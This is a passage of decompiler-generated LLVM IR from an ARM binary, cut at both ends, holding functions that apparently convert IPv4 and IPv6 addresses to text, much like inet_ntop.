  %v2_13a9c = add i32 %v0_13a9c, %v2_13ab0
  %v3_13a9c = inttoptr i32 %v2_13a9c to i8*
  %v4_13a9c = load i8, i8* %v3_13a9c, align 1
  %v3_13aa0 = inttoptr i32 %v2_13ab4 to i8*
  store i8 %v4_13a9c, i8* %v3_13aa0, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_13aa8 = load i32, i32* %fp.global-to-local, align 4
  %v3_13aa8 = load i32, i32* %ip.global-to-local, align 4
  %v4_13aa8 = add i32 %v3_13aa8, %v2_13aa8
  %v5_13aa8 = inttoptr i32 %v4_13aa8 to i8*
  store i8 0, i8* %v5_13aa8, align 1
  %v0_13aac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13aac.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_13ab4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13aac

dec_label_pc_13aac:                               ; preds = %dec_label_pc_13aac.preheader, %dec_label_pc_13a9c
  %v0_13ac0 = phi i32 [ %v1_13ac4.pre, %dec_label_pc_13aac.preheader ], [ %v1_13ab4.pre, %dec_label_pc_13a9c ]
  %v1_13ab0 = phi i32 [ %v2_13a8c, %dec_label_pc_13aac.preheader ], [ %v1_13aac.pre, %dec_label_pc_13a9c ]
  %v0_13ab8 = phi i32 [ 1, %dec_label_pc_13aac.preheader ], [ %v0_13aac.pre, %dec_label_pc_13a9c ]
  %v2_13ab0 = sub i32 %v1_13ab0, %v0_13ab8
  store i32 %v2_13ab0, i32* %ip.global-to-local, align 4
  %v2_13ab4 = sub i32 %v0_13ac0, %v0_13ab8
  store i32 %v2_13ab4, i32* @lr, align 4
  %v1_13ab8 = add i32 %v0_13ab8, 1
  store i32 %v1_13ab8, i32* %r2.global-to-local, align 4
  %v7_13abc = icmp slt i32 %v1_13ab0, %v0_13ab8
  br i1 %v7_13abc, label %dec_label_pc_13ac0, label %dec_label_pc_13a9c

dec_label_pc_13ac0:                               ; preds = %dec_label_pc_13aac
  store i32 %v0_13ac0, i32* @r4, align 4
  br label %dec_label_pc_13ac4

dec_label_pc_13ac4:                               ; preds = %dec_label_pc_13a80, %dec_label_pc_13ac0
  %v0_13ac4 = phi i32 [ %v0_13ac0, %dec_label_pc_13ac0 ], [ %v0_13ac4.pre, %dec_label_pc_13a80 ]
  %v1_13ac4 = phi i32 [ %v0_13ac0, %dec_label_pc_13ac0 ], [ %v1_13ac4.pre, %dec_label_pc_13a80 ]
  %v9_13ac4 = icmp eq i32 %v0_13ac4, %v1_13ac4
  br i1 %v9_13ac4, label %dec_label_pc_13acc, label %dec_label_pc_13af8

dec_label_pc_13acc:                               ; preds = %dec_label_pc_13ac4
  store i32 16, i32* @r2, align 4
  %v2_13ad0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_13ad0, i32* @r0, align 4
  store i32 %v2_13934, i32* @r1, align 4
  %v0_13ad8 = call i32 @function_ec10()
  store i32 %v0_13ad8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13afc

dec_label_pc_13ae4:                               ; preds = %dec_label_pc_13914
  %v0_13ae4 = call i32 @function_cc08()
  store i32 %v0_13ae4, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_13af0 = inttoptr i32 %v0_13ae4 to i32*
  store i32 97, i32* %v2_13af0, align 4
  %v0_13afc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13afc

dec_label_pc_13af8:                               ; preds = %dec_label_pc_13994, %dec_label_pc_139bc, %dec_label_pc_139dc, %dec_label_pc_139d0, %dec_label_pc_13a20, %dec_label_pc_13a88, %dec_label_pc_13a0c, %dec_label_pc_13ac4, %dec_label_pc_13958, %dec_label_pc_13a60, %dec_label_pc_13a14
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13afc

dec_label_pc_13afc:                               ; preds = %dec_label_pc_13ae4, %dec_label_pc_13acc, %dec_label_pc_13920, %dec_label_pc_13af8
  %v0_13afc = phi i32 [ %v0_13afc.pre, %dec_label_pc_13ae4 ], [ 1, %dec_label_pc_13acc ], [ %v4_13928, %dec_label_pc_13920 ], [ 0, %dec_label_pc_13af8 ]
  store i32 %v0_13afc, i32* %r0.global-to-local, align 4
  store i32 %v3_138fc, i32* @r4, align 4
  store i32 %v6_138fc, i32* @r5, align 4
  store i32 %v9_138fc, i32* @r6, align 4
  ret i32 %v0_13afc

; uselistorder directives
  uselistorder i32 %v0_13afc, { 1, 0 }
  uselistorder i32 %v2_13ab4, { 1, 0 }
  uselistorder i32 %v2_13ab0, { 1, 0 }
  uselistorder i32 %v0_13ab8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13ac0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13ac4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_13ac4.pre, { 2, 0, 1 }
  uselistorder i32 %v3_13a70, { 1, 0 }
  uselistorder i32 %v0_13ac4.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_13a48, { 1, 2, 3, 0 }
  uselistorder i32 %v0_13a24, { 1, 0 }
  uselistorder i32 %v3_139e8, { 1, 0 }
  uselistorder i32 %v0_139dc, { 1, 0, 2 }
  uselistorder i32 %v1_1398c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_13984, { 1, 0 }
  uselistorder i32 %v0_13968, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 2, 4, 6, 5, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 16, 9, 7, 6, 12, 8, 15, 14, 11, 10, 17, 13, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 1, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @function_145a8, { 1, 0 }
  uselistorder label %dec_label_pc_13afc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13af8, { 7, 5, 9, 4, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_13ac4, { 1, 0 }
  uselistorder label %dec_label_pc_13aac, { 1, 0 }
  uselistorder label %dec_label_pc_13a80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13a44.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13978, { 1, 0 }
}

define i32 @function_13b0c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13b0c:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13b0c = load i32, i32* @r4, align 4
  store i32 %v3_13b0c, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_17028.601 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_13b28 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_13b28, i32* @r0, align 4
  %v0_13b2c = call i32 @function_ec10()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 15, i32* @r2, align 4
  %v2_13b3c = bitcast i32* %stack_var_-51 to i8*
  %v3_13b3c = call i32 @function_ec20(i8* %v2_13b3c, i32 0)
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_13c04 = ptrtoint i32* %stack_var_-36 to i32
  %v2_13be0 = add i32 %v2_13c04, -17
  br label %dec_label_pc_13c04

dec_label_pc_13b4c:                               ; preds = %dec_label_pc_13c04
  %v0_13b4c = load i32, i32* %fp.global-to-local, align 4
  %v2_13b4c = add i32 %v0_13b4c, %v1_13b4c
  %v3_13b4c = inttoptr i32 %v2_13b4c to i8*
  %v4_13b4c = load i8, i8* %v3_13b4c, align 1
  %v6_13b4c = zext i8 %v4_13b4c to i32
  store i32 %v6_13b4c, i32* %r4.global-to-local, align 4
  %v1_13b50 = add i32 %v0_13b50, 1
  store i32 %v1_13b50, i32* %r7.global-to-local, align 4
  store i32 %v2_13c04, i32* %r2.global-to-local, align 4
  store i32 %v6_13b4c, i32* @r0, align 4
  %v2_13b5c = add i32 %v1_13b50, %v2_13c04
  store i32 %v2_13b5c, i32* %sl.global-to-local, align 4
  %v0_13b60 = call i32 @function_148a4()
  %v1_13b64 = add i32 %v0_13b60, 48
  %v1_13b68 = trunc i32 %v1_13b64 to i8
  %v2_13b68 = load i32, i32* %r5.global-to-local, align 4
  %v3_13b68 = add i32 %v2_13b68, -17
  %v4_13b68 = inttoptr i32 %v3_13b68 to i8*
  store i8 %v1_13b68, i8* %v4_13b68, align 1
  %v0_13b6c = load i32, i32* %r5.global-to-local, align 4
  %v1_13b6c = add i32 %v0_13b6c, -17
  %v2_13b6c = inttoptr i32 %v1_13b6c to i8*
  %v3_13b6c = load i8, i8* %v2_13b6c, align 1
  %v7_13b70 = icmp eq i8 %v3_13b6c, 48
  %v0_13b74 = load i32, i32* %fp.global-to-local, align 4
  %v1_13b74 = load i32, i32* %r8.global-to-local, align 4
  %v2_13b74 = add i32 %v1_13b74, %v0_13b74
  store i32 %v2_13b74, i32* %sb.global-to-local, align 4
  store i32 10, i32* @r1, align 4
  %v0_13b7c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13b7c, i32* @r0, align 4
  br i1 %v7_13b70, label %dec_label_pc_13b84, label %dec_label_pc_13bac

dec_label_pc_13b84:                               ; preds = %dec_label_pc_13b4c
  %v0_13b84 = call i32 @function_148a4()
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_13b8c = urem i32 %v0_13b84, 256
  %v2_13b90 = call i32 @function_c864(i32 %v1_13b8c, i32 10)
  %v1_13b94 = add i32 %v2_13b90, 48
  %v1_13b98 = trunc i32 %v1_13b94 to i8
  %v2_13b98 = load i32, i32* %r5.global-to-local, align 4
  %v3_13b98 = add i32 %v2_13b98, -17
  %v4_13b98 = inttoptr i32 %v3_13b98 to i8*
  store i8 %v1_13b98, i8* %v4_13b98, align 1
  %v0_13b9c = load i32, i32* %r5.global-to-local, align 4
  %v1_13b9c = add i32 %v0_13b9c, -17
  %v2_13b9c = inttoptr i32 %v1_13b9c to i8*
  %v3_13b9c = load i8, i8* %v2_13b9c, align 1
  %v7_13ba0 = icmp eq i8 %v3_13b9c, 48
  br i1 %v7_13ba0, label %dec_label_pc_13bd0, label %bb

bb:                                               ; preds = %dec_label_pc_13b84
  %v1_13ba4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_13ba4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13bd0

dec_label_pc_13bac:                               ; preds = %dec_label_pc_13b4c
  store i32 10, i32* @r1, align 4
  store i32 %v0_13b7c, i32* @r0, align 4
  %v0_13bb4 = call i32 @function_148a4()
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_13bbc = urem i32 %v0_13bb4, 256
  %v2_13bc0 = call i32 @function_c864(i32 %v1_13bbc, i32 10)
  %v1_13bc4 = add i32 %v2_13bc0, 48
  %v1_13bc8 = trunc i32 %v1_13bc4 to i8
  %v2_13bc8 = load i32, i32* %sl.global-to-local, align 4
  %v3_13bc8 = add i32 %v2_13bc8, -17
  %v4_13bc8 = inttoptr i32 %v3_13bc8 to i8*
  store i8 %v1_13bc8, i8* %v4_13bc8, align 1
  %v0_13bcc = load i32, i32* %r7.global-to-local, align 4
  %v1_13bcc = add i32 %v0_13bcc, 1
  store i32 %v1_13bcc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13bd0

dec_label_pc_13bd0:                               ; preds = %bb, %dec_label_pc_13b84, %dec_label_pc_13bac
  %v0_13bd0 = load i32, i32* %sb.global-to-local, align 4
  %v1_13bd0 = inttoptr i32 %v0_13bd0 to i8*
  %v2_13bd0 = load i8, i8* %v1_13bd0, align 1
  %v3_13bd0 = zext i8 %v2_13bd0 to i32
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_13bd8 = call i32 @function_c864(i32 %v3_13bd0, i32 10)
  store i32 %v2_13c04, i32* %ip.global-to-local, align 4
  %v1_13be0 = load i32, i32* %r6.global-to-local, align 4
  %v1_13be4 = add i32 %v1_13be0, 1
  store i32 %v1_13be4, i32* %r1.global-to-local, align 4
  %v1_13be8 = add i32 %v2_13bd8, 48
  %v1_13bec = trunc i32 %v1_13be8 to i8
  %v3_13bec = add i32 %v2_13be0, %v1_13be0
  %v4_13bec = inttoptr i32 %v3_13bec to i8*
  store i8 %v1_13bec, i8* %v4_13bec, align 1
  %v0_13bf0 = load i32, i32* %ip.global-to-local, align 4
  %v1_13bf0 = load i32, i32* %r1.global-to-local, align 4
  %v2_13bf0 = add i32 %v1_13bf0, %v0_13bf0
  store i32 %v2_13bf0, i32* %r2.global-to-local, align 4
  %v3_13bf8 = add i32 %v2_13bf0, -17
  %v4_13bf8 = inttoptr i32 %v3_13bf8 to i8*
  store i8 46, i8* %v4_13bf8, align 1
  %v0_13bfc = load i32, i32* %r8.global-to-local, align 4
  %v1_13bfc = add i32 %v0_13bfc, 1
  store i32 %v1_13bfc, i32* %r8.global-to-local, align 4
  %v0_13c00 = load i32, i32* %r1.global-to-local, align 4
  %v1_13c00 = add i32 %v0_13c00, 1
  br label %dec_label_pc_13c04

dec_label_pc_13c04:                               ; preds = %dec_label_pc_13b0c, %dec_label_pc_13bd0
  %v0_13b50 = phi i32 [ 0, %dec_label_pc_13b0c ], [ %v1_13c00, %dec_label_pc_13bd0 ]
  %v1_13b4c = phi i32 [ 0, %dec_label_pc_13b0c ], [ %v1_13bfc, %dec_label_pc_13bd0 ]
  store i32 %v2_13c04, i32* %r2.global-to-local, align 4
  store i32 100, i32* @r1, align 4
  store i32 %v0_13b50, i32* %r6.global-to-local, align 4
  %v2_13c14 = add i32 %v0_13b50, %v2_13c04
  store i32 %v2_13c14, i32* %r5.global-to-local, align 4
  %v7_13c18 = icmp sgt i32 %v1_13b4c, 3
  br i1 %v7_13c18, label %dec_label_pc_13c1c, label %dec_label_pc_13b4c

dec_label_pc_13c1c:                               ; preds = %dec_label_pc_13c04
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_13b28, i32* %r4.global-to-local, align 4
  %v3_13c24 = add i32 %v2_13c14, -18
  %v4_13c24 = inttoptr i32 %v3_13c24 to i8*
  store i8 0, i8* %v4_13c24, align 1
  store i32 %v2_13b28, i32* @r0, align 4
  %v0_13c2c = call i32 @function_ecc0()
  %v2_13c30 = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v0_13c2c, %v2_13c30
  br i1 %tmp, label %dec_label_pc_13c3c, label %dec_label_pc_13c50

dec_label_pc_13c3c:                               ; preds = %dec_label_pc_13c1c
  %v0_13c3c = call i32 @function_cc08()
  %v0_13c44 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13c44, i32* %r2.global-to-local, align 4
  %v2_13c48 = inttoptr i32 %v0_13c3c to i32*
  store i32 28, i32* %v2_13c48, align 4
  %v0_13c60.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13c60

dec_label_pc_13c50:                               ; preds = %dec_label_pc_13c1c
  store i32 %v2_13b28, i32* %r1.global-to-local, align 4
  %v2_13c58 = bitcast i32* %stack_var_-53 to i8*
  %v3_13c58 = call i32 @function_ed20(i32 %arg2, i8* %v2_13c58)
  store i32 %v3_13c58, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13c60

dec_label_pc_13c60:                               ; preds = %dec_label_pc_13c3c, %dec_label_pc_13c50
  %v0_13c60 = phi i32 [ %v0_13c60.pre, %dec_label_pc_13c3c ], [ %v3_13c58, %dec_label_pc_13c50 ]
  %v2_13c68 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_13c68, i32* @r4, align 4
  ret i32 %v0_13c60

; uselistorder directives
  uselistorder i32 %v1_13b4c, { 1, 0 }
  uselistorder i32 %v0_13b50, { 0, 2, 1 }
  uselistorder i32 %v2_13c04, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 3, 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 1, 4, 5, 0 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 2, 6, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 6, 7, 8, 1, 2, 3, 0 }
  uselistorder i32 (i32, i32)* @function_c864, { 8, 7, 10, 6, 5, 4, 3, 2, 1, 9, 0 }
  uselistorder i8 48, { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_13c60, { 1, 0 }
  uselistorder label %dec_label_pc_13c04, { 1, 0 }
  uselistorder label %dec_label_pc_13bd0, { 2, 0, 1 }
}

define i32 @function_13c70(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13c70:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_13c70 = load i32, i32* @r4, align 4
  store i32 %v3_13c70, i32* %stack_var_-32, align 4
  %v6_13c70 = load i32, i32* @r5, align 4
  %v25_13c70 = ptrtoint i32* %stack_var_-32 to i32
  %v7_13c74 = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_13c74, label %dec_label_pc_13c98, label %dec_label_pc_13c8c

dec_label_pc_13c8c:                               ; preds = %dec_label_pc_13c70
  %v7_13c8c = icmp eq i32 %arg1, 10
  br i1 %v7_13c8c, label %dec_label_pc_13cac, label %dec_label_pc_13eac

dec_label_pc_13c98:                               ; preds = %dec_label_pc_13c70
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_13ca4 = call i32 @function_13b0c(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_13ea4

dec_label_pc_13cac:                               ; preds = %dec_label_pc_13c8c
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_13cb8 = bitcast i32* %stack_var_-64 to i8*
  %v3_13cb8 = call i32 @function_ec20(i8* %v2_13cb8, i32 0)
  br label %dec_label_pc_13cd8

dec_label_pc_13cc4:                               ; preds = %dec_label_pc_13cd8
  %tmp68 = icmp slt i32 %v1_13cc8, 0
  %v4_13cd8 = zext i1 %tmp68 to i32
  %v5_13cd8 = add i32 %v4_13cd8, %v1_13cc8
  %v3_13cdc = sdiv i32 %v5_13cd8, 2
  %v4_13cec = mul i32 %v3_13cdc, 4
  %v5_13cec = add i32 %v4_13cec, %v25_13c70
  %v1_13cc4 = add i32 %v2_13ce8, 1
  %v2_13cc4 = inttoptr i32 %v1_13cc4 to i8*
  %v3_13cc4 = load i8, i8* %v2_13cc4, align 1
  %v4_13cc4 = zext i8 %v3_13cc4 to i32
  %v3_13cc8 = inttoptr i32 %v2_13ce8 to i8*
  %v4_13cc8 = load i8, i8* %v3_13cc8, align 1
  %v6_13cc8 = zext i8 %v4_13cc8 to i32
  store i32 %v6_13cc8, i32* %r2.global-to-local, align 4
  %v4_13ccc = mul nuw nsw i32 %v6_13cc8, 256
  %v5_13ccc = or i32 %v4_13ccc, %v4_13cc4
  %v2_13cd0 = add i32 %v5_13cec, -32
  %v3_13cd0 = inttoptr i32 %v2_13cd0 to i32*
  store i32 %v5_13ccc, i32* %v3_13cd0, align 4
  %v0_13cd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_13cd4 = add i32 %v0_13cd4, 2
  br label %dec_label_pc_13cd8

dec_label_pc_13cd8:                               ; preds = %dec_label_pc_13cac, %dec_label_pc_13cc4
  %v1_13cc8 = phi i32 [ 0, %dec_label_pc_13cac ], [ %v1_13cd4, %dec_label_pc_13cc4 ]
  store i32 %v1_13cc8, i32* %r1.global-to-local, align 4
  %v0_13ce8 = load i32, i32* @r8, align 4
  %v2_13ce8 = add i32 %v0_13ce8, %v1_13cc8
  store i32 %v2_13ce8, i32* %r2.global-to-local, align 4
  %v7_13cf0 = icmp sgt i32 %v1_13cc8, 15
  br i1 %v7_13cf0, label %dec_label_pc_13cf4, label %dec_label_pc_13cc4

dec_label_pc_13cf4:                               ; preds = %dec_label_pc_13cd8
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13d04

dec_label_pc_13d04:                               ; preds = %dec_label_pc_13cf4, %dec_label_pc_13d50
  %v0_13d44 = phi i32 [ -1, %dec_label_pc_13cf4 ], [ %v0_13d78, %dec_label_pc_13d50 ]
  %v0_13d34 = phi i32 [ -1, %dec_label_pc_13cf4 ], [ %v0_13d64, %dec_label_pc_13d50 ]
  %v0_13d18 = phi i32 [ -1, %dec_label_pc_13cf4 ], [ %v0_13d188, %dec_label_pc_13d50 ]
  %v0_13d50 = phi i32 [ 0, %dec_label_pc_13cf4 ], [ %v1_13d50, %dec_label_pc_13d50 ]
  %v4_13d08 = mul nuw nsw i32 %v0_13d50, 4
  %v5_13d08 = add i32 %v4_13d08, %v25_13c70
  %v1_13d0c = add i32 %v5_13d08, -32
  %v2_13d0c = inttoptr i32 %v1_13d0c to i32*
  %v3_13d0c = load i32, i32* %v2_13d0c, align 4
  %v2_13d10 = icmp eq i32 %v3_13d0c, 0
  %v7_13d18 = icmp eq i32 %v0_13d18, -1
  br i1 %v2_13d10, label %dec_label_pc_13d18, label %dec_label_pc_13d2c

dec_label_pc_13d18:                               ; preds = %dec_label_pc_13d04
  br i1 %v7_13d18, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13d18
  store i32 %v0_13d50, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_13d50

.thread:                                          ; preds = %dec_label_pc_13d18
  %v1_13d24.pre = load i32, i32* @r4, align 4
  %v2_13d24 = add i32 %v1_13d24.pre, 1
  store i32 %v2_13d24, i32* @r4, align 4
  br label %dec_label_pc_13d50

dec_label_pc_13d2c:                               ; preds = %dec_label_pc_13d04
  br i1 %v7_13d18, label %dec_label_pc_13d50, label %dec_label_pc_13d34

dec_label_pc_13d34:                               ; preds = %dec_label_pc_13d2c
  %v7_13d34 = icmp eq i32 %v0_13d34, -1
  %v0_13d48.pre = load i32, i32* @r4, align 4
  %v1_13d3c = load i32, i32* @r7, align 4
  %v7_13d40 = icmp sgt i32 %v0_13d48.pre, %v1_13d3c
  %or.cond = or i1 %v7_13d34, %v7_13d40
  br i1 %or.cond, label %dec_label_pc_13d44, label %dec_label_pc_13d4c

dec_label_pc_13d44:                               ; preds = %dec_label_pc_13d34
  store i32 %v0_13d44, i32* @r6, align 4
  store i32 %v0_13d48.pre, i32* @r7, align 4
  br label %dec_label_pc_13d4c

dec_label_pc_13d4c:                               ; preds = %dec_label_pc_13d34, %dec_label_pc_13d44
  %v0_13d3413 = phi i32 [ %v0_13d44, %dec_label_pc_13d44 ], [ %v0_13d34, %dec_label_pc_13d34 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13d50

dec_label_pc_13d50:                               ; preds = %bb, %.thread, %dec_label_pc_13d2c, %dec_label_pc_13d4c
  %v0_13d78 = phi i32 [ %v0_13d44, %.thread ], [ %v0_13d50, %bb ], [ %v0_13d44, %dec_label_pc_13d2c ], [ -1, %dec_label_pc_13d4c ]
  %v0_13d188 = phi i32 [ %v0_13d18, %.thread ], [ %v0_13d50, %bb ], [ -1, %dec_label_pc_13d2c ], [ -1, %dec_label_pc_13d4c ]
  %v0_13d64 = phi i32 [ %v0_13d34, %.thread ], [ %v0_13d34, %bb ], [ %v0_13d34, %dec_label_pc_13d2c ], [ %v0_13d3413, %dec_label_pc_13d4c ]
  %v1_13d50 = add nuw nsw i32 %v0_13d50, 1
  store i32 %v1_13d50, i32* %r1.global-to-local, align 4
  %v7_13d58 = icmp slt i32 %v1_13d50, 8
  br i1 %v7_13d58, label %dec_label_pc_13d04, label %dec_label_pc_13d5c

dec_label_pc_13d5c:                               ; preds = %dec_label_pc_13d50
  %v7_13d5c = icmp eq i32 %v0_13d78, -1
  br i1 %v7_13d5c, label %dec_label_pc_13d7c, label %dec_label_pc_13d64

dec_label_pc_13d64:                               ; preds = %dec_label_pc_13d5c
  %v7_13d64 = icmp eq i32 %v0_13d64, -1
  %v0_13d74.pre = load i32, i32* @r4, align 4
  br i1 %v7_13d64, label %dec_label_pc_13d74, label %dec_label_pc_13d6c

dec_label_pc_13d6c:                               ; preds = %dec_label_pc_13d64
  %v1_13d6c = load i32, i32* @r7, align 4
  %v7_13d70 = icmp sgt i32 %v0_13d74.pre, %v1_13d6c
  br i1 %v7_13d70, label %dec_label_pc_13d74, label %dec_label_pc_13d7c

dec_label_pc_13d74:                               ; preds = %dec_label_pc_13d64, %dec_label_pc_13d6c
  store i32 %v0_13d74.pre, i32* @r7, align 4
  store i32 %v0_13d78, i32* @r6, align 4
  br label %dec_label_pc_13d7c

dec_label_pc_13d7c:                               ; preds = %dec_label_pc_13d6c, %dec_label_pc_13d5c, %dec_label_pc_13d74
  %v0_13d7c = phi i32 [ %v0_13d64, %dec_label_pc_13d6c ], [ %v0_13d64, %dec_label_pc_13d5c ], [ %v0_13d78, %dec_label_pc_13d74 ]
  %v7_13d7c = icmp eq i32 %v0_13d7c, -1
  br i1 %v7_13d7c, label %bb49, label %dec_label_pc_13d84

dec_label_pc_13d84:                               ; preds = %dec_label_pc_13d7c
  %v0_13d84 = load i32, i32* @r7, align 4
  %v7_13d88 = icmp slt i32 %v0_13d84, 2
  br i1 %v7_13d88, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_13d84
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_13d7c, %dec_label_pc_13d84, %bb48
  %v0_13d9823 = phi i32 [ %v0_13d7c, %dec_label_pc_13d7c ], [ %v0_13d7c, %dec_label_pc_13d84 ], [ -1, %bb48 ]
  %v2_13d8c = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_13d8c, i32* @r4, align 4
  %v9_13df8 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_13d9863 = icmp eq i32 %v0_13d9823, -1
  br label %dec_label_pc_13d98

dec_label_pc_13d98:                               ; preds = %bb49, %dec_label_pc_13e4c
  %v7_13d9867 = phi i1 [ %v7_13d9863, %bb49 ], [ %v7_13d98, %dec_label_pc_13e4c ]
  %v0_13dc466 = phi i32 [ 0, %bb49 ], [ %v1_13e4c, %dec_label_pc_13e4c ]
  %v1_13db465 = phi i32 [ %v0_13d9823, %bb49 ], [ %v0_13d98.pre, %dec_label_pc_13e4c ]
  %v3_13dcc64 = phi i32 [ %v2_13d8c, %bb49 ], [ %v3_13dbc24, %dec_label_pc_13e4c ]
  br i1 %v7_13d9867, label %dec_label_pc_13dc4, label %dec_label_pc_13da0

dec_label_pc_13da0:                               ; preds = %dec_label_pc_13d98
  %v9_13da0 = icmp eq i32 %v0_13dc466, %v1_13db465
  %v5_13da4 = icmp slt i32 %v0_13dc466, %v1_13db465
  br i1 %v5_13da4, label %dec_label_pc_13dc4, label %dec_label_pc_13da8

dec_label_pc_13da8:                               ; preds = %dec_label_pc_13da0
  %v1_13da8 = load i32, i32* @r7, align 4
  %v2_13da8 = add i32 %v1_13da8, %v1_13db465
  %v6_13db0 = icmp slt i32 %v0_13dc466, %v2_13da8
  br i1 %v6_13db0, label %dec_label_pc_13db4, label %dec_label_pc_13dc4

dec_label_pc_13db4:                               ; preds = %dec_label_pc_13da8
  br i1 %v9_13da0, label %bb51, label %dec_label_pc_13e4c

bb51:                                             ; preds = %dec_label_pc_13db4
  %v4_13dbc = inttoptr i32 %v3_13dcc64 to i8*
  store i8 58, i8* %v4_13dbc, align 1
  %v5_13dbc = load i32, i32* @r4, align 4
  %v6_13dbc = add i32 %v5_13dbc, 1
